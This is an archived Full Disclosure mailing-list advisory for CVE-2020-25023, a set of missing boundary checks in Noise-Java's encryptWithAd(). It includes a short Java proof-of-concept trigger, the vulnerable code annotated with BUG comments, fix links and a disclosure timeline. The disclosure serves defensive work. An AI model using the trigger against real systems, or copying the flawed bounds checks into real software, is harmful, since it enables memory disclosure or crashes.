<!-- MHonArc v2.6.19 -->
<!--X-Head-End-->
<!DOCTYPE html>
<html lang="en">
<head>
<script async src="/site.js"></script>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://seclists.org/rss/fulldisclosure.rss">
<meta property="og:image" content="https://seclists.org/images/fulldisclosure-img.png" />
<link rel="image_src" href="https://seclists.org/images/fulldisclosure-img.png" />

<meta name="Subject" content="Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks"/>
<meta name="Author" content="Pietro Oliva via Fulldisclosure"/>
<title>Full Disclosure: Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#2A0D45">
<link rel="preload" as="image" href="/images/sitelogo.png" imagesizes="168px" imagesrcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x">
<link rel="preload" as="image" href="/shared/images/nst-icons.svg">
<link rel="stylesheet" href="/shared/css/nst.css?v=2">
<script async src="/shared/js/nst.js?v=2"></script>
<link rel="stylesheet" href="/shared/css/nst-foot.css?v=2" media="print" onload="this.media='all'">
<link rel="stylesheet" href="/site.css">
<!--Google Analytics Code-->
<link rel="preload" href="https://www.google-analytics.com/analytics.js" as="script">
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
ga('create', 'UA-11009417-1', 'auto');
ga('send', 'pageview');
</script>
<!--END Google Analytics Code-->
<META NAME="ROBOTS" CONTENT="NOARCHIVE">
<link rel="shortcut icon" href="/shared/images/tiny-eyeicon.png" type="image/png">
</head>
<body><div id="nst-wrapper">

<div id="menu">
 <div class="blur">
  <header id="nst-head">

    <a id="menu-open" href="#menu" aria-label="Open menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#menu">
    </a>
    <a id="menu-close" href="#" aria-label="Close menu">
     <img width="44" height="44" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#close">
    </a>

   <a id="nst-logo" href="/" aria-label="Home page">
    <img alt="Home page logo" srcset="/images/sitelogo.png, /images/sitelogo-2x.png 2x" src="/images/sitelogo.png" onerror="this.onerror=null;this.srcset=this.src" height=90 width=168></a>

   <nav id="nst-gnav">
    <a class="nlink" href="https://nmap.org/">Nmap.org</a>
    <a class="nlink" href="https://npcap.com/">Npcap.com</a>
    <a class="nlink" href="https://seclists.org/">Seclists.org</a>
    <a class="nlink" href="https://sectools.org">Sectools.org</a>
    <a class="nlink" href="https://insecure.org/">Insecure.org</a>
   </nav>

   <form class="nst-search" id="nst-head-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>

  </header>
 </div>
</div>

<main id="nst-content">

<!--X-Body-Begin-->
<!--X-User-Header-->
<a href="/fulldisclosure/"><img src="/images/fulldisclosure-logo.png" width="80" class="l-logo right" alt="fulldisclosure logo"></a>
<h2 class="m-list"><a href="/fulldisclosure/">Full Disclosure</a>
mailing list archives</h2>
<!--X-User-Header-End-->
<!--X-TopPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="11"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#13">By Date</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="11"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#13">By Thread</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<form class="nst-search center" action="/search/fulldisclosure">
<input class="nst-search-q" name="q" type="search" placeholder="List Archive Search">
<button class="nst-search-button" title="Search">
<img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
src="/shared/images/nst-icons.svg#search">
</button>
</form>

</div>

<!--X-TopPNI-End-->
<!--X-MsgBody-->
<!--X-Subject-Header-Begin-->
<h1 class="m-title">Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks</h1>
<hr>
<!--X-Subject-Header-End-->
<!--X-Head-of-Message-->


<em>From</em>: Pietro Oliva via Fulldisclosure &lt;fulldisclosure () seclists org&gt;<br>

<em>Date</em>: Wed, 2 Sep 2020 07:58:30 +0000<br>

<!--X-Head-of-Message-End-->
<!--X-Head-Body-Sep-Begin-->
<hr>
<!--X-Head-Body-Sep-End-->
<!--X-Body-of-Message-->
<pre style="margin: 0em;">Vulnerability title: Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks
Author: Pietro Oliva
CVE: CVE-2020-25023
Vendor: Rhys Weatherley (Creator of Noise Framework&apos;s reference implementation in Java)
Product: Noise-Java 
Affected version: No version information is currently available.
Fixed version:    Check latest commit and pull request

Description:
The issue is located in the AESGCMOnCtrCipherState.encryptWithAd() method 
defined in AESGCMOnCtrCipherState.java, where multiple boundary checks are
performed to prevent invalid length or offsets from being specified for the
encrypt or copy operation. However, some checks were found to be either 
incomplete or missing, which would likely lead to the following scenarios:
- Out-of-bounds read or write with huge plaintextOffset, negative cipertextOffset,
  or negative length (Depending on the underlying JVM&apos;s validation).
- Exception thrown by the JVM instead of Noise-Java throwing ShortBufferException 

Impact:
Further checks might be implemented in the JVM and an exception might be thrown 
before attempting any operation with invalid arguments.
If that is not the case, OOB read/write or a silent return on invalid arguments
might occur. This could in turn lead to arbitrary code execution in the context
of the JVM, memory disclosure, denial of service, or data loss.

Proof of concept:
Depending on the JVM, running the following code will result in either OOB read
(see CVE-2020-17360 in Avian JVM) or exception being thrown by the JVM:

package com.southernstorm.noise.protocol;

public class poc {

    public static void main(String[] args) {
        byte[] plaintext = &quot;This is my plaintext&quot;.getBytes();
        byte[] ciphertext = new byte[plaintext.length];
        CipherState cs = new AESGCMOnCtrCipherState();

        // Passing a large plaintextOffset should result in a ShortBufferException
        // instead of relying on the JMV&apos;s implementation of System.arraycopy.
        try {
                cs.encryptWithAd(null, plaintext, 0x7fffffff, ciphertext, 0, 1);
        }
        catch(Exception e){
                System.out.println(&quot;An exception has been thrown: &quot; + e);
        }

    }
}
 

Evidence:

public int encryptWithAd(byte[] ad, byte[] plaintext, int plaintextOffset,
        byte[] ciphertext, int ciphertextOffset, int length)
            throws ShortBufferException {
    int space;
    if (ciphertextOffset &gt; ciphertext.length) // BUG: ciphertextOffset could be negative,
                                              // bypassing this length check
        space = 0;
    else
        space = ciphertext.length - ciphertextOffset;
        // BUG: a negative ciphertextOffset would increase the space instead of decreasing it
    if (keySpec == null) {
        if (length &gt; space) // BUG: this check can be bypassed with negative ciphertextOffset
            throw new ShortBufferException();
        if (plaintext != ciphertext || plaintextOffset != ciphertextOffset)

            /* Multiple issues here:
            1. plaintextOffset is never checked. Depending on the JVM&apos;s implementation,
               This could result in OOB read in arraycopy (see CVE-2020-17360 for Avian JVM) or
               exception being thrown.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB read/write or exception being thrown.
            3. If the length is negative, depending on the JVM, arraycopy could result in OOB
               read/write, exception being thrown, or silent return (e.g. CVE-2020-17360 in Avian) */

            System.arraycopy(plaintext, plaintextOffset, ciphertext, ciphertextOffset, length);
        return length;
    }
    if (space &lt; 16 || length &gt; (space - 16)) // BUG: this can be bypassed with negative length
        throw new ShortBufferException();
    try {
        setup(ad);

            /* Multiple issues here as well:
            1. plaintextOffset is never checked. this could result in an exception being thrown
               by the JVM.
            2. ciphertextOffset could be negative, bypassing the checks on the length.
               Depending on the JVM, this could result in OOB write in arraycopy or exception being thrown.
            3. length could be negative. Depending on the JVM, this could result in OOB write in arraycopy
               or exception being thrown. */

        int result = cipher.update(plaintext, plaintextOffset, length, ciphertext, ciphertextOffset);
        cipher.doFinal(ciphertext, ciphertextOffset + result);
    } catch (InvalidKeyException e) {
        // Shouldn&apos;t happen.
        throw new IllegalStateException(e);
    } catch (InvalidAlgorithmParameterException e) {
        // Shouldn&apos;t happen.
        throw new IllegalStateException(e);
    } catch (IllegalBlockSizeException e) {
        // Shouldn&apos;t happen.
        throw new IllegalStateException(e);
    } catch (BadPaddingException e) {
        // Shouldn&apos;t happen.
        throw new IllegalStateException(e);
    }
    ghash.update(ciphertext, ciphertextOffset, length);
    ghash.pad(ad != null ? ad.length : 0, length);
    ghash.finish(ciphertext, ciphertextOffset + length, 16);
    for (int index = 0; index &lt; 16; ++index)
        ciphertext[ciphertextOffset + length + index] ^= hashKey[index];
        return length + 16;
    }

As can be seen in the above code, multiple boundary checks are either missing
or incomplete, allowing for invalid length or offsets to be passed to the JVM&apos;s
implementation of System.arraycopy or other methods that handle encryption. 
Depending on the JVM in use and how the missing/incomplete checks are exploited,
this could result in either OOB read/write, silent return, or exception thrown
by the underlying JVM. OOB read/write could result in memory/secrets disclosure,
arbitrary code execution in the context of the JVM, or crash.    

Mitigating factors:
Unless the JVM has some vulnerability on its own (such as CVE-2020-17360 and 
CVE-2020-17361 in Avian JVM), this vulnerability would likely result in an
unhandled exception being thrown and/or crash of the JVM process. 

Remediation:
The fixes for this vulnerability can be found below:
<a  rel="nofollow" href="https://github.com/rweather/noise-java/commit/18e86b6f8bea7326934109aa9ffa705ebf4bde90">https://github.com/rweather/noise-java/commit/18e86b6f8bea7326934109aa9ffa705ebf4bde90</a> 
<a  rel="nofollow" href="https://github.com/rweather/noise-java/pull/12/files">https://github.com/rweather/noise-java/pull/12/files</a>

Disclosure timeline:
28th Aug 2020  - Vulnerability reported to vendor.
29th Aug 2020  - Patch committed by vendor.
2nd Sept 2020  - Improvement for this patch provided by vulnerability reporter.
2nd Sept 2020  - Vulnerability details are made public.

_______________________________________________
Sent through the Full Disclosure mailing list
<a  rel="nofollow" href="https://nmap.org/mailman/listinfo/fulldisclosure">https://nmap.org/mailman/listinfo/fulldisclosure</a>
Web Archives &amp; RSS: <a  rel="nofollow" href="http://seclists.org/fulldisclosure/">http://seclists.org/fulldisclosure/</a>

</pre>
<!--X-Body-of-Message-End-->
<!--X-MsgBody-End-->
<!--X-Follow-Ups-->
<hr>
<!--X-Follow-Ups-End-->
<!--X-References-->
<!--X-References-End-->
<!--X-BotPNI-->
<div class="nav-bar">
<div class="nav-link">
<a href="11"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="date.html#13">By Date</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
<div class="nav-link">
<a href="11"><img src="/images/left-icon-16x16.png" width=16 height=16 alt="Previous"></a>
<a href="index.html#13">By Thread</a>
<a href="14"><img src="/images/right-icon-16x16.png" width=16 height=16 alt="Next"></a>
</div>
</div>
<h3 class="m-thread">Current thread:</h3>
<ul class="thread">
<li><strong>Noise-Java AESGCMOnCtrCipherState.encryptWithAd() insufficient boundary checks</strong> <em>Pietro Oliva via Fulldisclosure (Sep 04)</em>
</ul>


<!--X-BotPNI-End-->
<!--X-User-Footer-->
<!--X-User-Footer-End-->
</main><!-- content -->

<footer id="nst-foot">
   <form class="nst-search" id="nst-foot-search" action="/search/">
    <input class="nst-search-q" name="q" type="search" placeholder="Site Search">
    <button class="nst-search-button" title="Search">
     <img style="width:100%;aspect-ratio:1/1;" alt="" aria-hidden="true"
      src="/shared/images/nst-icons.svg#search">
     </button>
   </form>
<div class="flexlists">
<div class="fl-unit">
<h2><a class="nlink" href="https://nmap.org/">Nmap Security Scanner</a></h2>
<ul>
<li><a class="nlink" href="https://nmap.org/book/man.html">Ref Guide</a>
<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

